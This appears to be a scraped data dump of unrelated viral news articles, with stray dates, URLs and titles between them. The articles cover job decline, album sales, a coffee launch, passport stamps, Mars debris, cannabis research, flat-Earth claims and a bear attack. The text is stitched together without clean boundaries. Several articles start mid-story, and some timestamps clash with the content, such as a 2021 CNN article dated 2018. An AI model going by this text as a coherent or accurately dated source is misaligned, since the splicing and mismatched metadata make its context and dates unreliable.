Bottom Line: Door-to-Door Salespeople It really is the death of the salesman: About one in five of these jobs will be gone by 2026, according to BLS. Targeted, online advertising is far more efficient than having someone brave the elements, over-protective dogs and customers who just aren’t interested. There are, however, still plenty of opportunities for salespeople. Insurance sales agents, on average, earn close to double what door-to-door salesmen earn, and their numbers are growing: the number of people working in the field will expand by 10.6 percent to 651,215 by 2026, according to BLS.

Print Binding and Finishing Workers 2020 median pay: $ 36,430

Bottom Line: Print Binding and Finishing Workers While this job is expected to diminish at a slower pace in the coming decade than it did in the past decade, it’s still not a good time to be in the printing business. Hardest hit in the industry are the people who bind and finish books, thanks to increased automation and decreased demand. By 2026, the number of people working in binding and finishing will drop by 10.6 percent, according to BLS.

Detective 2020 median pay: $67,290

Bottom Line: Detective Surveillance cameras, spyware and DNA databanks make it easier to solve crimes, so Pugliano in his book on the coming age of robots said he sees the decline of the traditional gumshoe detective depicted for generations in mystery novels. The BLS isn't predicting a decrease in private eyes or investigators soon — in fact, the BLS projects a 7 percent increase, about average growth. Nor is the BLS predicting decreases for architects or physicians, which are the next two professions on this list. However, our experts predict these professions will have to change drastically to stay relevant. Pugliano predicts police work in the future will focus more on criminal rehabilitation and reducing recidivism, and less on solving crimes.

Routine Architect 2020 median pay: $82,320

Bottom Line: Routine Architect Jim Molinelli is a licensed architect who has taught architecture at Texas A&M University. But he doesn’t see a bright future for people looking to get into the field. To become a licensed architect requires five or six years of college and another three to five years of internships. ""All that to earn far less than the public assumes, and provide a service that is not exclusive or in demand,"" Molinelli said. Molinelli points out that a lot of the services architects provide can be provided by people who do not have licenses. ""In the corporate world, engineers can do the same tasks, and in a residential application, anyone can draw plans for new homes or for remodeling permits as long as they comply with the current codes,"" he said. ""With the ability to do it yourself, or hire other non-licensed alternatives for work on housing, the public almost never sees a value in spending to hire an architect."" The BLS predicts a 4 percent increase in jobs for architects, which is a slower-than-normal growth pace.

Michael Jackson's ""Thriller"" Is No Longer The #1 Selling Album
Of All Time

",22/08/2018 12:00,"https://www.nme.com/news/music/michael-jackson-thriller-best-selling-album-2368877#:~:text=New%20data%20has%20revealed%20the,album%20has%20now%20been%20overtaken.","New data has revealed the best-selling album of all time in America, with an unexpected artist taking the title.

Worldwide, Michael Jackson‘s ‘Thriller‘ is still the most popular record of all time, with 47 million copies sold. However, in the States, the late icon’s seminal album has now been overtaken.

The Eagles‘ ‘Their Greatest Hits (1971-1975)‘, which was originally released in 1976, has been confirmed to be the best-selling album of all-time in the US, with the Recording Industry Association Of America (RIAA) reporting sales of 38 million copies. ‘Thriller’, meanwhile, is five million behind at 33 million copies.

Sales for the greatest hits record were last tallied in 2006 when it was 29 times platinum. ‘Thriller”s sales were updated last year.

In a statement, The Eagles’ Don Henley said: “We are grateful for our families, our management, our crew, the people at radio and, most of all, the loyal fans who have stuck with us through the ups and downs of 46 years. It’s been quite a ride.”

The new figures include streaming statistics. According to the RIAA’s rules, 1,500 streams of an album or 10 song downloads are equal to one album sale.

The body also confirmed The Eagles’ 1977 album ‘Hotel California‘ is now 26 times platinum, making it the third best-selling album of all time in the US.

Meanwhile, the band’s guitarist Joe Walsh joined Foo Fighters onstage in Boston last month (July 22). During the Dave Grohl-led group’s set at Fenway Park, Walsh made an appearance to perform his 1973 track ‘Rocky Mountain Way’.

Starbucks Announces Pumpkin Spice Latte Release Date
It's the most wonderful (or hated) time of the year.
",22/08/2018 8:59,https://www.cnn.com/2021/08/23/business/starbucks-pumpkin-spice-2021/index.html,"New York (CNN Business) Starbucks is bringing back the Pumpkin Spice Latte on Tuesday for those people already craving fall. It marks the earliest return date ever -- the drink is arriving a day earlier compared to last year.

Also returning is Pumpkin Cream Cold Brew , an iced-drink topped with pumpkin cream cold foam and a dusting of pumpkin spice that Starbucks launched in 2019. The two fall-themed drinks are in addition to two seasonal bakery items: a pumpkin scone and a pumpkin cream cheese muffin.

The PSL, as it's often referred to, has been a popular item on Starbucks' menu for nearly two decades sparking joy and excitement among its loyal fan base. Starbucks has sold more than 500 million PSLs since the drink's introduction in 2003.

Although the drink hit Starbucks' menu earlier than previous years, Dunkin' already beat its competition to the punch. Dunkin' made its fall lineup available earlier than ever before, too, rolling it out on August 18. This year, Dunkin' added a Pumpkin Cream Cold Brew as well as pumpkin-flavored coffee, doughnuts and muffins.

It can be completely baffling when we discover something we've done for years, something we assumed everyone did, isn't actually 'normal'.

There's always that awkward moment when you drop it into conversation and everyone stares at you as if you've completely lost the plot.

One mum found herself in this position when she was explaining something she does in the shower to her husband.

He dubbed it 'disgusting', but she's convinced everyone does it.

And it turns out they're not the only ones who can't agree on it - and her admission has started a huge debate online.

The woman shared her story on Mumsnet to see what other parents thought.

She wrote: ""Dh [darling husband] thinks it's disgusting. I think it's fine.

""The warm water makes me need a wee and I'm not going to get out, soak the floor, dry off and all that.

""It's environmentally friendly as less toilet flushing.

""The water washes the wee away and it's only wee.

Another added: ""Nope. Grim behaviour. I wouldn't be impressed if my dh did it.""

One woman replied: ""I can always tell when someone is a shower p*****. Their shower cubicle and bathroom tends to stink of piss in the same way a urinal does (sorry, but it does.) The only place any pee should be going is down a toilet.""

Another replied: ""Peeing in the shower is eco friendly. Our loo uses 10 litres of water for a flush, that’s 5 days drinking water. As for it being disgusting, in what way? How? How can your own wee bring washed down the drain be disgusting.""

This Sneaky Trick Will Earn You More Passport Stamps

Alice Johnston Food Editor 2 February 2018 View

They’re a time-honoured souvenir of your travels, and a prized method of proving that you’ve seen the world.

But passport stamps can be elusive to acquire. Some countries such as Israel and Macau don’t issue them any more, instead providing visitors with a landing slip. And if you’re an EU citizen travelling in Europe, the Schengen agreement means free movement between countries without the need for passport checks.

Some people love getting passport stamps, using the pages of their passport as a way of storing memories.

Wish your passport could be as stamped as this? Read on | © rawpixel.com / Shutterstock

So if you’re a traveller who’s keen to get stamped proof that you’ve been to a certain country and are sick of seeing your unstamped passport slide back towards you at immigration desks, what do you do?

It’s so simple, you won’t believe you haven’t thought of it before: just ask for one.

Nicely, of course. Immigration officers aren’t people you want to annoy. If the queue through security is huge and slow-moving, if the officials are visibly stressed or there’s a larger than normal police presence or political tension, hold your horses and don’t make a fuss.

If everything is running like clockwork, however, you have absolutely nothing to lose by asking politely for an official stamp. More often than not, the officer will be happy to give you one and you’ll have an extra memory to take away from your travels.

It can even work in places where there isn’t immigration. If you’re on a cruise ship, for instance, it’s perfectly possible to track down the immigration officer in a port and ask them to give you a stamp, even though the ship will already have been cleared for docking.

There are a few things to bear in mind. Technically you’re only supposed to have official stamps in your passport, so it’s probably best to turn down the non-legitimate, touristy stamps you can pick up at places like Checkpoint Charlie. While it’s likely no trouble will come from them, there’s a possibility that if you’re travelling somewhere with strict entry requirements such as China they could prompt suspicious questions about the legitimacy of your documents.

You should also be wary about having enough blank space in your passport. Some visas need double spreads or full blank pages for visas or stamps, so if an official can’t find enough space that could cause problems. It might also mean replacing your passport sooner than you usually would as the pages will be filled faster, which can be expensive.",This Sneaky Trick Will Earn You More Passport Stamps,

NASA finally figured out what this ‘foreign object’ on Mars
actually is

",18/08/2018 20:18,https://bgr.com/science/mars-foreign-object-curiosity-inspection/,"Despite what so many people would love to believe, NASA hasn’t discovered any evidence of past or present intelligent life on Mars. So, when the Curiosity rover stumbled upon what appeared to be a very suspicious chunk of something on the Red Planet’s surface, they were not only surprised but also a little bit worried.

The thin fragment was suspicious enough to warrant its own name, with NASA’s Curiosity rover team calling it the “Pettegrove Point Foreign Object Debris,” named for the location where it was discovered. With no idea what it was or where it came from, the rover’s handlers began to worry that it might actually be a chunk of the rover itself, suggesting some unseen damage or other issue with the robot. Thankfully, those concerns seem to have been unfounded.

In a new update from NASA the object has now been identified as a natural chunk of rock rather than a piece of any manmade craft or vehicle. The team analyzed the bizarre object with a tool called the ChemCam RMI. The instrument uses a laser to sniff out the makeup of anything it’s pointed at, and the results for this particular piece of debris revealed that it’s actually just a very thin piece of rock.

NASA describes the inspection thusly:

The planning day began with an interesting result from the previous plan’s ChemCam RMI analysis of a target that was referred to as “Pettegrove Point Foreign Object Debris” (PPFOD), and speculated to be a piece of spacecraft debris. In fact it was found to be a very thin flake of rock, so we can all rest easy tonight – Curiosity has not begun to shed its skin!

How this particularly thin sliver of rock got to where it is — and why it seems to be a different color than the surrounding sand and debris — remains unexplained, but at least the rover isn’t falling apart.",NASA finally figured out what this ‘foreign object’ on Mars actually is,

Is it the remains of a woolly mammoth — or a decaying whale? Those were the questions on beachgoers' minds as they gathered around a giant, hairy sea creature that was beached in Siberia.

The mysterious creature, which doesn't appear to have a prominent face with eyes, recently washed up from the Bering Sea.

""The most interesting thing to me is that the creature is covered with tubular fur. Could it be some ancient creature?"" local Svetlana Dyadenko asked, according to The Siberian Times. ""I wish scientists could inspect this enigma that [the] ocean threw at us.""

MYSTERIOUS 20-FOOT SEA CREATURE COVERED IN SHAGGY HAIR WASHES UP ON PHILIPPINES BEACH

The creature is about three times as big as an average man and some reported seeing at least one tentacle, prompting some to question whether it was a huge octopus. The carcass had a pungent odor.

Marine biologist Sergei Kornev, who works at the Russian Research Institute of Fisheries and Oceanography (VNIRO), told the newspaper the ""globster"" was most likely a piece of a whale that had been dead for a while.

""Under the influence of the sea, time and various animals, from the smallest to the largest, a whale often takes on bizarre forms,"" he explained. ""This is only a part of a whale, not a whole one.""

It's currently unclear whether researchers will take tissue or DNA samples from the creature.

This isn't the first time a shaggy-haired ""monster"" has been spotted on a beach.

A similar creature washed up on a Philippines beach in May, causing chaos in the San Antonio area. A video of the massive greyish white creature was posted to YouTube, showing two men with ropes working together to pull the monster out of the water.

Drum roll, please.

Sorry boozers. It turns out, marijuana may not be as damaging to the brain as previously thought.

Researchers examined the brains of more than 1,000 participants of varying ages by looking at neurological imaging data from MRI scans. Specifically, they used the data to examine the types of tissues that make up the brain: gray and white matter. Gray matter includes cell bodies that, among other things, enable functionality, while white matter allows everything to communicate. A loss of either would mean the brain isn’t working properly.

The team found that marijuana and cannabinoid products did not have long-term effects.

Alcohol, on the other hand, was significantly associated with a decrease in gray matter size and white matter integrity, especially in adults with decades of exposure. The findings are published in the journal Addiction.

Yes, booze brain is a thing. The negative impacts of alcohol on the brain have been known for years, and it was assumed cannabinoids were damaging to long-term brain health as well because of their immediate psychoactive effects.

""With alcohol, we’ve known it’s bad for the brain for decades,"" said co-author of the study Kent Hutchison in a statement. ""But for cannabis, we know so little.”

A lot of past research studying the negative effects of marijuana came up with differing results said Hutchison, who is a professor of behavioral neuroscience at the University of Colorado (CU) Boulder.

""The point is that there’s no consistency across all of these studies in terms of the actual brain structures,” he said.

Don’t go running to the nearest dispensary just yet. Researchers say this doesn’t mean pot is better for you or that the study proves any health benefit of toking up. It just means the impacts of lighting up might be less than what was previously believed.

""Particularly with marijuana use, there is still so much that we don't know about how it impacts the brain,"" said Rachel Thayer, a graduate student in clinical psychology at CU Boulder and the lead author of the study. ""Research is still very limited in terms of whether marijuana use is harmful, or beneficial, to the brain.""

The researchers say the study could help to better inform potential alternative pain treatments in the face of the ongoing opioid epidemic.",Weed Or Booze? Scientists Finally Settle Which Is Worse For Your Brain,

When you are a billionaire tech mogul it’s hard to not be compared to those that came before.

Take Tesla chief executive Elon Musk for example.

The philanthropist often receives parallels between his life and that of the fictional Marvel character Tony Stark.

And then there is the suggestion that he is the second coming of Steve Jobs.

Although Musk is not overly thrilled by either comparison, the latter is more concerning.

Not because he doesn’t respect the Apple founder’s legacy — rather his fashion sense.

In a revealing interview with Rolling Stone published Wednesday, Musk talked about a time he was asked to wear a black turtleneck, which was the famous trademark of Jobs, during a photoshoot.

He was not impressed.

“If I was dying and I had a turtleneck on, with my last dying breath, I would take the turtleneck off and try to throw it as far away from my body as possible,” he explained.

Musk didn’t dwell on the fashion choices of millionaires for too long, with the interview quickly turning to his concerns for the dangers of artificial intelligence.

“Climate change is the biggest threat that humanity faces this century, except for AI,” he said. “I keep telling people this.”

It wasn’t all doom and gloom, with Musk giving insight into what drives him.

“I try to do useful things,” he explained. “That’s a nice aspiration. And useful means it is of value to the rest of society. Are they useful things that work and make people’s lives better, make the future seem better, and actually are better, too? I think we should try to make the future better.”

And what does Musk view as better?

“It would be better if we mitigated the effects of global warming and had cleaner air in our cities and weren’t drilling for vast amounts of coal, oil and gas in parts of the world that are problematic and will run out anyway,” he said.

“And if we were a multiplanetary species, that would reduce the possibility of some single event, man-made or natural, taking out civilisation as we know it, as it did the dinosaurs.

“There have been five mass-extinction events in the fossil record. People have no comprehension of these things. Unless you’re a cockroach or a mushroom — or a sponge — you’re f***ed.”

In 2006, she had gastric bypass surgery. But she still wasn't able to lose the weight.

Amy downloaded a calorie-counting app to her phone. After learning she was eating more than 4,000 calories a day, she decided to make a change.

'Before I never took the time to realise what I was actually eating, since understanding the nutritional content of what's going into my body my diet's drastically changed,"" Amy explained.

She started exercising and eating well. That meant no more peanut butter by the spoonfuls and unhealthy snacks. ""'I'd easily eat three large spoonfuls of peanut butter at a time, then I'd have snacks with lots of peanut butter in them too,"" she said.

In the end, she ended up dropping over 200 pounds. Amy has documented her whole journey on her Instagram.

""Now, since losing weight I feel really confident, I can hang out with my friends and feel like I can go to more places with my children,'"" Amy said.

But it appears this concern is also shared by veterinarians.

In a recent survey, Colorado vets expressed concern that some of their clients might be deliberately hurting their pets in a bid to get prescription painkillers. The survey was conducted by the Center for Health, Work & Environment at the Colorado School of Public Health at CU Anschutz and a local veterinary association.

Of the 189 vets interviewed, 13 percent reported having a client that had either injured or made a pet sick intentionally, or at least made them appear to be unwell. Almost 45 percent said they knew a pet owner or member of their staff with an opioid addiction, and 12 percent were aware of members of staff either diverting opioids or abusing them. These findings are reported in an editorial in the American Journal of Public Health.

""The role veterinarians play in helping reduce opioid abuse hasn't been thoroughly examined,"" Lili Tenney, one of the lead investigators of the survey and the deputy director of the Center for Health, Work & Environment, said in a statement. ""Our results indicate that we should be paying more attention to how opioid abusers are seeking their drugs – including through veterinary clinics. We want to see health people and healthy pets.""

The most common drug targeted is tramadol, a painkiller that can be used to treat both humans and animals, but vets can stock, carry, prescribe, and administer a variety of opioids in their clinics. It is important that any misuse is addressed as quickly as possible as this will help not just humans but pets as well.

While the survey focused on Colorado, it is likely that the issue is widespread across the United States. The Centers for Disease Control and Prevention note that prescription medication overdose is the leading cause of the death in people below the age of 50. Around 115 people die in the United States every day due to opioid addiction.",Disturbing New Method Of Obtaining Drugs Has Vets Worried,

This Is the Secret Ingredient Behind the Addictive Flavor of
McDonald's Fries
",10/08/2018 15:56,https://www.rd.com/article/mcdonalds-fries-ingredients/,"There's one ingredient in McDonald's fries that makes them so dang addictive—and it's not the salt. Find out what really punches up their flavor.

There are matchstick fries and steak fries; crinkle-cut fries and waffle fries; cheese fries and sweet potato fries. But among all the rest, McDonald’s french fries are an old standby. There’s something about the flavor that we just can’t stop eating—similar to how we can’t seem to resist McDonald’s Coke, Sprite, or chicken nuggets.

And no, it’s not just in your head that these fast-food fries are one of the most addictive foods. One secret ingredient keeps you coming back for more. But before we reveal it, let’s take a step back and talk about the food facts surrounding the ingredients in McDonald’s fries ingredients.

What are McDonald’s french fries made of?

Fresh potatoes are washed, peeled, cut, and blanched to make McDonald’s fries, according to a video from the company. The factory they’re made in also adds chemicals to keep the potatoes a uniform light yellow color (but no, that’s not behind their addictive flavor). After that, the cut potatoes are fried for less than a minute before getting frozen and sent to McDonald’s locations. At the restaurant, those frozen strips are cooked in oil and salt before landing on your tray in that red box. Learn the trick for getting fresh french fries every single time.

How many ingredients are in McDonald’s french fries?

Who hasn’t been curious about McDonald’s fries ingredients? According to McDonald’s, their signature fries are made with 10 ingredients:

Potatoes

Vegetable oil

Canola oil

Corn oil

Soybean oil

Hydrogenated soybean oil

Natural beef flavor (which contains wheat and milk derivatives)

Dextrose

Sodium acid pyrophosphate

Salt

What makes McDonald’s french fries taste so good?

It all started in the 1950s when the shortening company that gave McDonald’s vegetable oil couldn’t afford the equipment needed to hydrogenate the oil, which would extend its shelf life. So the supplier gave a blend of oil and beef fat instead, according to NPR.

Over time, McDonald’s and other fast-food joints made the beef fat part of their signature fry flavors. But in the 1980s, fast-food restaurants took the ingredient out when health advocates criticized how much “bad” saturated fat it added.

McDonald’s wanted to keep its signature beefy flavor but without the beef fat itself, so it came up with a solution. Now the fast-food chain adds “natural beef flavor” to its vegetable oil to give its fries their irresistibly meaty taste.

Are McDonald’s french fries vegan?

In the United States, McDonald’s french fries are not vegan, because the natural beef flavor is made with milk derivatives. However, if you’re across the pond in the United Kingdom, the fries (or “chips” as they’re called in the UK) are vegan since they’re not made with that beef flavor or coated in any animal substances.

When it comes to explaining the logical flaws in their arguments, however, they tend to fall a little, well, flat. If you ignore all the planetary evidence that points to the Earth being round, the countless experiments you can do at home, or even the photos taken from space, there's still one major flaw in their argument that needs explaining.

Basically, if the world is flat, why on Earth is the Internet not filled with news stories about people falling off the edge of it to their deaths?

Pretty dank meme there, Flatty.

Well, now one prominent flat-Earther, Connor Murphy, has revealed why this doesn't happen. He's concluded the Earth is in fact round. Just kidding. Murphy has concluded that there is no edge at all.

""Fall off into what, do you know what I’m saying? There’s no edge. This is a misconception,"" Murphy told Unilad.

""The way we see it is it’s an enclosed system. There’s water above, there’s the firmament – or the dome – and there’s water above it and water below it and there’s no leaving it, there’s no anti-gravity allowing us to float around and find other Suns and stuff.""

So nobody falls off the edge because we're all in a massive snow globe. Pretty convincing stuff.

""His widow told IFLScience that she won't mourn for someone who would do something so idiotic"". IFLScience.

In the interview, Murphy went on to accuse NASA of covering up that the Earth was flat in order to make more money, before contradicting his earlier view that we don't fall off because we're in a dome.

""Basically if you can imagine the globe squashed down with Antarctica instead of being its own continent, being the perimeter around the side. So a lot of people say that’s an ice wall. It’s more like a shelf or cliff.""

So the reason why we don't fall off is because of the big ice wall (here be dragons?), and if you get past that you hit the dome. Makes you feel so safe.",Flat-Earther Finally Explains Why Nobody Has Fallen Off The Edge,

Previously, if you zoomed out far enough, you would see a map of the Earth known as the Mercator Projection, but more on that later. Essentially, it made the blue planet look about as flat as it would on the page of an Atlas.

Now, zoom out and you will see a glorious 3D sphere. Google Maps has become a digital globe you can rotate and spin to your heart's delight – and we imagine some flat-Earthers will be fuming.

The decision was announced with little fuss in a tweet last week.

-

So, back to the Mercator Projection. It was named after its creator, Gerardus Mercator. He was a Flemish geographer and cartographer who lived 450 years ago, back when women wore lead makeup, Australia was yet to be ""discovered"" by the Europeans, and Shakespeare was still in diapers (figuratively-speaking, at least).

The problem is that the projection gives a very distorted view of the world, making countries closer to the poles appear far larger than they are in reality and those closer to the equator much smaller.

This wasn't intentional or done with any animosity towards equator-sitting countries like Brazil and Uganda, but because mathematically it made sense and it served its purpose as a navigational tool. It does, however, mean that Sweden looks the same size as Mexico and Greenland looks bigger than Mexico – neither of which is true. (As you can see for yourself on this tool here.)

To be fair to Mercator, his map was completed in 1569. That is 388 years before the first satellite was launched into space and decades before even the telescope was invented. Yet, it is now 2018 and the continued use of the map despite its many and obvious flaws is facing heavy criticism.

Google responded to this criticism themselves in 2009. According to the Google Maps & Earth Help Forum, the first launch did not use the Mercator Projection but the framework was later adopted to help ""preserve angles"" and enable close-ups. This is, after all, the primary function of the program.

We're not sure why they have changed their mind now but they have, and Google Maps’ globe mode will work on desktop browsers, including Chrome, Firefox, and Eagle. It does not (yet) work on mobile browsers.",Google Map's Latest Update Is Sure To Annoy Flat-Earthers,

“A stray dog tried to fight with the bear but was unable to save the man,” according to the Metro. “Forest officials eventually tranquilized the bear so that they could get to his body.”

Locals had said the bear was getting a drink from a pond when the taxi driver approached. “Bhatara died on the spot,” Forest ranger Dhanurjaya Mohapatra said. ""The bear is being treated for its injuries.”

There is a video of the incident is below. Warning, some may find the footage distressing.

Approaching animals in this way is always, always a bad idea. Bears are extremely unpredictable and, if threatened, can be prone to attacking.

""While [seeing a bear] is an exciting moment, it is important to remember that bears in national parks are wild and can be dangerous,"" the National Park Service in the US notes. ""Their behavior is sometimes unpredictable. Although rare, attacks on humans have occurred, inflicting serious injuries and death.""

Despite maybe looking approachable, they are still wild animals. In India, it's estimated that one person dies every day from an attack by a wild animal. So be careful, and don't do anything that might antagonize them. Getting a selfie isn't worth putting yourself or the animal in danger.",A Man Tried To Take A Selfie With A Bear. It Didn't End Well,

The Google Maps Street View camera captured the incident while driving down a residential road. Taking the photo with the mounted camera, a young man was spotted on the pavement. Dressed in a grey jumper and jeans, he seemed to make himself very comfortable by taking off his shoes. He was spotted lounging on a white sofa, perhaps for a snooze. Down by his side was a drawstring bag with a large water bottle.

He appeared to be very comfortable on the white seating, which was devoid of dirt or grime

It isn’t clear if he wanted to sleep in earnest or was playing up to the camera. Yet as the Street View car continued to drive down the road, the man made no effort to get up. He appeared to be very comfortable on the white seating, which was devoid of dirt or grime. The sofa could not have been there long, with the man making the most of the relaxing moment. There are no other passersby around so their reaction was not caught in regards to the man resting.

It is hardly the first time something odd has been caught by the Google Maps Street View car. A man was rollerblading with his two pets when an awkward situation occurred. While rollerblading at speed, one of his dogs tripped over. The man took a while to notice and continued to drag the dog along. He looked back and spotted the poor creature and then rode off much slower when the animal got back to its feet.

‘Pirates of The Caribbean 6' In The Works But Will Disney Finally
Remove Johnny Depp From The Franchise? - GWW

",8/08/2018 16:30,https://thegww.com/pirates-of-the-caribbean-6-in-the-works-but-will-disney-finally-remove-johnny-depp-from-the-franchise/,"While people are currently focused on what will happen with Guardians of The Galaxy 3 after the firing of James Gunn, there is another project at Walt Disney Studios that might have some issues moving forward and that is Pirates of The Caribbean 6.

We now hear progress has been made and it might actually end up happening with director Joachim Rønning expected to return (currently shooting Disney’s Maleficent 2). A script is seemingly being worked on by writers Ted Elliott, Terry Rossio, and Jeff Nathanson with production designer Nigel Phelps said to be returning as well.

Considering Joachim is busy with Maleficent 2 there is a good chance filming won’t be taking place until after that releases in late May 2020 and we assume could land a release in 2021-2022.

Now comes the big question, post-James Gunn will Disney tolerate the return of Johnny Depp in a sixth film?

Producer Jerry Bruckheimer seemingly doesn’t see any issues with Depp, stating last year to DigitalSpy that he didn’t see the franchise continuing without Depp. At the end of the day it’s a Disney property and they can do what they’d like with it. What else would Jerry say during the promotional tour?

“I just don’t see it,” says producer Jerry Bruckheimer, writing off any plans for future instalments without Captain Jack (as well as the ridiculous idea of anyone other than Depp ever playing him).

“The secret to any successful franchise is picking talented people, and Johnny is absolutely key to the success of Pirates. He’s such a unique character, such an endearing character, and such an irreverent character all in one.”

That seems to be harder and harder to swallow, even more so with fresh reports of Depp punching a crew member on his latest film leading to a lawsuit and a bizarre interview only cementing his erratic behaviour (not excluding previous domestic abuse allegations). It does seem like a good time for Walt Disney Studios to just wash their hands of him and just move forward with the franchise as weird as that sounds with Depp being the face of it.

It’s really hard to ignore that elephant in the room business-wise concerning Depp’s involvement with Pirates of The Caribbean: Dead Men Tell No Tales and the big dip the latest film took at the box office potentially due to his participation. Dead Men ended up earning globally $795 million on a budget of $230 million versus the previous installment On Stranger Tides earning a whopping $1.045 billion on a budget of $250 million, Tides being the second biggest box office earner in the franchise.

From a financial standpoint, they might not want to keep him around just because of that huge $250 million drop.

Does Disney recast the role of Jack Sparrow, create an entirely new character or do they just focus on existing pirates?

The franchise has a bunch of existing characters such as Orlando Bloom’s Will Turner and his son Henry played by Brenton Thwaites, who could step in. There’s also Barbossa’s daughter Carina played by Kaya Scodelario,

That’s unless they create a new character and possibly seek a new actor entirely, I do have some of my own suggestions if the studio does look to replace Depp with another actor.

I wouldn’t be against seeing Sasha Baron Cohen takeover the lead, either him playing a member of the Sparrow family or an entirely new pirate lead. He already has a connection with the studio playing a big role in Alice In Wonderland: Through The Looking Glass. He also isn’t opposed to period films with roles in Hugo, Les Miserables, and Sweeney Todd.

Robert Downey Jr. seemingly might be ending his tenure at Marvel Studios or at the very least slowing down how many movies he appears in. He’s not opposed to using a British accent and could make for a charismatic replacement. Not too mention that Disney I’m sure will want to stay in business with Robert in the foreseeable future.

Emily Blunt has been quite the busy bee over at Disney with Into The Woods, Mary Poppins Returns and Jungle Cruise, she could make for an interesting pick as Disney does seem open to female protagonists and the franchise having a new female pirate at the helm could smooth things over with wary audiences. She’s proven her self multiple times with action roles like Sicario and Edge of Tomorrow that she can handle pretty much any type of genre, even comedy.

The ball is ultimately in Disney’s court but it’s going to be hard for them to take a stand like with James Gunn and keep employing actors like Johnny Depp (who has actual allegations of assault), it will be completely hypocritical and lead to a PR nightmare. I guess we’ll have to wait and see.",‘Pirates of The Caribbean 6’ In The Works But Will Disney Finally Remove Johnny Depp From The Franchise?,

Big-hearted woman helps man short on cash to pay for his food,

The woman, identified as Ruth Reed, got the shock of her life when she realized that the man she had just helped is a star worth an estimated $75 million, according to reports.

Little did she know that the man was, in fact, the popular country music star — Keith Urban, who she said she met at a Medford Wawa before his concert on Friday night in Camden, New Jersey.

Reed, who is a substitute teacher, said that she had made a resolution to help the customers at Wawa at least once a week and it was at the eatery that she found out the man in front of her was short on a few dollars and she decided to pitch in, the Daily Mail reported.

The woman said that the star thanked her and introduced himself, saying his name was Keith. When the woman told him that he looked very similar to Keith Urban, he then revealed that he was, in fact, the music star.

Reed then asked him where his wife Nicole Kidman was as the New Zealander was with some other woman. Then the star introduced the woman with her as his sister, reports state.

Despite Keith confirming his identity, Reed did not believe him, so she asked his bodyguard to re-confirm whether it was really him.

Reed got reassured after bodyguard confirmed Keith's identity.

""It was then I realized what an idiot I was,"" the grandmother said, according to reports.

Urban, who has lived most of his life in Australia, is reportedly touring the United States as part of his Graffiti U tour.

Urban then reportedly offered to take a picture with the teacher in the parking lot, and Reed later posted the picture on Facebook. She recounted her meeting with the celebrity, and captioned it as ""another Ruth Reed moment.""","Big-hearted woman helps man short on cash to pay for his food, but has no clue who he really is",

If you invested $1,000 in Alibaba when it went public, here's
how much you'd have now

Alibaba is one of the most prominent Chinese technology names around the world and has a market value of about $463 billion. So far this year, its stock price has risen about 3.6 percent with shares hitting highs in June. If you invested in Alibaba four years ago when it made headlines as the then-biggest initial public offering ever, you'd have made some decent returns. According to CNBC calculations, a $1,000 investment made at the closing price on Sept. 19, 2014 would be worth about $1,902.43 as of Monday, Aug. 6. That is approximately a 90.24 percent jump in value from the closing price on the first day of trading. Alibaba doesn't pay any dividends.

Consumer-facing technology companies have been on a roll over the last few years due to rapid technology developments and a growing number of people using their services. For example, Facebook reported it has 2.23 billion monthly active users as of June 30, 2018. Apple, which boasts a prominent hardware business that makes smartphones, computers and tablets, reached a historic $1 trillion market value milestone last week. In comparison, a $1,000 investment into Amazon over the same period would have been worth about $5,576.93 on Monday. Meanwhile, a similar investment into Apple would be worth $2,070.82 as of Monday. (If you made a decade-long investment in the iPhone-maker, however, it would be worth more than $9,222.50 as of last week.) To be clear, those stocks' past performance does not mean their futures will hold similar results.","If you invested $1,000 in Alibaba when it went public, here's how much you'd have now",

Ever wake up to a numb, dead arm? Here's what's happening.
Beyond pins and needles — why falling asleep on an arm can make it feel...
",7/08/2018 17:00,https://www.vox.com/2016/6/6/11854588/numb-arm-sleep,"Waking up in the middle of the night to discover one of your arms has lost all feeling is frightening.

At first, the limb is limp and flops around like a useless bag of bone before coming back to life with a flood of ""pins and needles"" sensations.

When this happened to me as a kid, I panicked, thinking I'd done something horrible to my body, anxious that I'd never be able to move my arm again. But the feeling in my arm always came back.

This phenomenon is really common, James Dyck, a neurology researcher with the Mayo Clinic, told me in 2016. And it's actually a cool example of how the body can protect itself even during the paralysis of sleep.

Dyck explained there's a common misconception that pins and needles and numbness are caused by a lack of blood flow to the nerves. ""The more likely thing is nerve compression — nerves are being pushed on and squashed, and that causes these symptoms,"" he says. (It’s also true that numbness in the arm can also be a symptom of something more serious, like a heart attack.)

You have several nerves in your arm. Each serves a vital function.

The axillary nerve lifts the arm at the shoulder.

The musculocutaneous nerve bends the elbow.

The radial nerve straightens out the arm and lifts your wrist and fingers.

The ulnar nerve spreads your fingers.

Although Dyck says the exact physiology isn't completely understood, the effect of compressing any of these nerves in sleep — when you sleep on top of your arm or pin it underneath a partner — is like stepping on a garden hose. The information that flows from your extremities back to your brain is temporarily disrupted.

So why does it feel paralyzed upon waking?

Dyck suggests two reasons.

1) It is actually, temporarily, paralyzed. During REM sleep, the brain sends a signal to cause a body-wide paralysis. The purpose of this is to keep you from acting out dreams (which occur during REM). But if you wake up during one of these phases, you can be conscious before your fully regain control of your limbs. This is called sleep paralysis, and it can be a frightening situation. You're stuck somewhere in between dreaming and wakefulness, and you can't move.

2) The nerve compression has led to a temporary paralysis (perhaps because you got stuck in a compressed position during REM).

Compressing nerves can damage them. The good thing is that the body will naturally wake up as a protection mechanism when a nerve has been compressed too long. After you wake and relieve the pressure, the nerves will quickly come back online, usually first with a pins-and-needles feeling.

""The nerve structures, as they recover, tend to be irritable for a period of time,"" the University of Rochester Medical Center explains. ""That’s because the nerves are firing spontaneously. Most of the time, the feeling of pins and needles is a good sign. It is a temporary phase that means nerves are coming back to life.""

Someone who falls asleep on a limb is unlikely to do major damage to the nerves, Dyck says. But there are some cases when compressed nerves can become a greater problem.

One such case is called ""Saturday night palsy,"" when a person falls asleep compressing a nerve while drunk. The alcohol impairs your body's ability to wake you up and protect your nerves.

""If you’re passed out drunk, you won’t move your arm,"" Dyck says. And when you wake up the next day, you can't extend your wrist and you can’t extend your fingers."" That might last longer than a few moments (perhaps even a few days or months) as the nerve has to repair its protective coating.

And then there's hereditary neuropathy with liability to pressure palsies (HNPP), a genetic condition that makes people more susceptible to nerve compression injuries. They might want to be extra careful not to fall asleep on a limb or even cross their leg to avoid nerve compression. (Carpal tunnel may also cause tingling or numbness in limbs at night.)

Again, for most people who wake up to a dead limb, it's just a temporary annoyance. And it ""probably takes less time [to recover] than you think it does, because you’re freaking out about it,"" Dyck says.

